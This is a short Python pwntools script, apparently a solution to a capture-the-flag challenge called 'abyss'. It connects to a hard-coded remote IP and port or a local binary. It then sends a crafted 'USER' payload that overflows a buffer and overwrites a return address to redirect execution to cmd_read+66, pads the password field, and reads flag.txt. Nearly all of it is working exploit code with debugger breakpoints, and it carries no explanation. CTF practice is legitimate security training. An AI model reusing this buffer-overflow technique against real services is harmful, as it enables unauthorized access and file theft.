from pwn import *

#b *cmd_login+355
#b *0x401462
gs = '''
b *cmd_login+319
b *0x401462
continue
'''

elf = context.binary = ELF("./abyss")

def start():
    if args.REMOTE:
        return remote("94.237.50.175", 42268)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.send(b"\x00"*4)

io.recvrepeat(1)

payload = b"".join([
    b"A"*17,
    b"\x1c",
    b"A"*11,
    p64(elf.sym.cmd_read + 66) #p64(0x4014eb) # test eax, eax  # eax no sera 0 xD o sino usa gadgets D: aunque no es necesario cambiar su valor
])

io.sendline(b"USER " + payload)

io.recvrepeat(1)

io.send(b"PASS " + b"D" * (512 - 5))

io.recvrepeat(1)

io.send(b"flag.txt\x00")

io.interactive()
